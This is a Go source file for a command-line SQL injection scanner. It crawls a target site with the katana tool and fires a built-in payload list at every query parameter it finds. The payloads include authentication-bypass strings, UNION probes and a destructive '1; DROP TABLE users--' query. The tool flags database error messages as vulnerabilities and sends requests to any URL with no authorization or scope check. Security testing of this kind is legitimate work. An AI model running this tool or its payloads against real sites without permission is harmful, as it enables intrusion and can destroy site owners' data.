package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"
)

const colorReset = "\033[0m"
const colorRed = "\033[31m"
const colorGreen = "\033[32m"
const colorYellow = "\033[33m"
const colorBlue = "\033[34m"
const colorMagenta = "\033[35m"
const colorCyan = "\033[36m"

func printBanner() {
	banner := `
    ▞▀▖▞▀▖▌  ▗ ▌ ▌      ▐        
    ▚▄ ▌ ▌▌  ▄ ▙▄▌▌ ▌▛▀▖▜▀ ▞▀▖▙▀▖
    ▖ ▌▌▚▘▌  ▐ ▌ ▌▌ ▌▌ ▌▐ ▖▛▀ ▌  
    ▝▀ ▝▘▘▀▀▘▀▘▘ ▘▝▀▘▘ ▘ ▀ ▝▀▘▘ v1.0                                                            
   SQL Injection Vulnerability Scanner
 `
	fmt.Println(colorRed + banner + colorReset)
	fmt.Println()
}

var sqlPayloads = []string{
	"'",
	"' OR '1'='1",
	"' OR '1'='1'--",
	"' OR '1'='1'/*",
	"1' AND '1'='1",
	"1' AND '1'='2",
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	"1; DROP TABLE users--",
}

var sqlErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(sql syntax|mysql|syntax error|oracle|postgresql|sqlite|mysqli?|pdo)`),
	regexp.MustCompile(`(?i)(warning.*mysql|mysql server version|mariadb server)`),
	regexp.MustCompile(`(?i)(ora-\d{5}|oracle error|plsql)`),
	regexp.MustCompile(`(?i)(pg::|postgresql query failed)`),
	regexp.MustCompile(`(?i)(sqlite jdbc|sqlite3::)`),
	regexp.MustCompile(`(?i)(microsoft sql server|sqlstate\[HY\d{3}\])`),
	regexp.MustCompile(`(?i)(unclosed quotation mark|quoted string not properly terminated)`),
}

type Result struct {
	URL         string
	Param       string
	Vulnerable  bool
	Error       string
	Payload     string
}

func main() {
	printBanner()

	target := flag.String("u", "", "Target URL to scan")
	output := flag.String("o", "", "Output file for results (optional)")
	threads := flag.Int("t", 10, "Number of concurrent threads")
	timeout := flag.Int("timeout", 10, "Request timeout in seconds")
	depth := flag.Int("d", 3, "Crawling depth (0 = no depth limit)")
	verbose := flag.Bool("v", false, "Verbose output - show all endpoints and parameters")
	flag.Parse()

	if *target == "" {
		fmt.Println("Usage: sqliscanner -u <target_url> [-o output_file] [-t threads] [-timeout seconds] [-d depth] [-v]")
		os.Exit(1)
	}

	normalizedURL := normalizeURL(*target)
	fmt.Printf("[*] Crawling %s for parameterized endpoints...\n", normalizedURL)

	endpoints := crawlWithKatana(normalizedURL, *depth)
	if len(endpoints) == 0 {
		fmt.Println("[!] No parameterized endpoints found")
		os.Exit(0)
	}

	fmt.Printf("[+] Found %d parameterized endpoints\n", len(endpoints))

	jobs := make(chan string, len(endpoints))
	results := make(chan Result, 100)
	var wg sync.WaitGroup

	if *verbose {
		fmt.Println("[*] Discovered endpoints:")
		for _, ep := range endpoints {
			fmt.Printf("    - %s\n", ep)
		}
	}

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(*timeout, jobs, results, &wg)
	}

	for _, endpoint := range endpoints {
		jobs <- endpoint
	}
	close(jobs)

	go func() {
		wg.Wait()
		close(results)
	}()

	var vulns []Result
	for r := range results {
		if r.Vulnerable {
			vulns = append(vulns, r)
			fmt.Printf("[!] VULNERABLE: %s (%s) - Payload: %s\n", r.URL, r.Param, r.Payload)
		}
	}

	if *output != "" {
		writeResults(*output, vulns)
	}

	fmt.Printf("\n[*] Scan complete. Found %d potential SQL injection vulnerabilities.\n", len(vulns))
}

func normalizeURL(u string) string {
	if !strings.HasPrefix(u, "http://") && !strings.HasPrefix(u, "https://") {
		return "https://" + u
	}
	return u
}

func crawlWithKatana(target string, depth int) []string {
	katanaPath := "/home/user/go/bin/katana"
	if _, err := exec.LookPath("katana"); err == nil {
		katanaPath = "katana"
	}
	args := []string{"-u", target, "-jc", "5", "-kf", "all", "-output", "-"}
	if depth > 0 {
		args = append(args, "-d", fmt.Sprintf("%d", depth))
	}
	cmd := exec.Command(katanaPath, args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[!] Katana error: %v\n", err)
		return nil
	}

	var endpoints []string
	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "?") {
			endpoints = append(endpoints, line)
		}
	}

	unique := make(map[string]bool)
	for _, ep := range endpoints {
		unique[ep] = true
	}

	var result []string
	for ep := range unique {
		result = append(result, ep)
	}
	return result
}

func worker(timeout int, jobs <-chan string, results chan<- Result, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}

	for endpoint := range jobs {
		u, err := url.Parse(endpoint)
		if err != nil {
			continue
		}

		params := u.Query()
		for param := range params {
			for _, payload := range sqlPayloads {
				testURL := injectPayload(endpoint, param, payload)

				resp, err := client.Get(testURL)
				if err != nil {
					continue
				}

				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()

				vuln := false
				for _, pattern := range sqlErrorPatterns {
					if pattern.MatchString(string(body)) {
						vuln = true
						results <- Result{
							URL:        testURL,
							Param:      param,
							Vulnerable: true,
							Payload:    payload,
						}
						break
					}
				}
				if vuln {
					break
				}
			}
		}
	}
}

func injectPayload(endpoint, param, payload string) string {
	u, _ := url.Parse(endpoint)
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

func writeResults(filename string, results []Result) {
	f, err := os.Create(filename)
	if err != nil {
		fmt.Printf("[!] Error creating output file: %v\n", err)
		return
	}
	defer f.Close()

	f.WriteString("# SQL Injection Scan Results\n\n")
	for _, r := range results {
		f.WriteString(fmt.Sprintf("URL: %s\n", r.URL))
		f.WriteString(fmt.Sprintf("Parameter: %s\n", r.Param))
		f.WriteString(fmt.Sprintf("Payload: %s\n\n", r.Payload))
	}
}
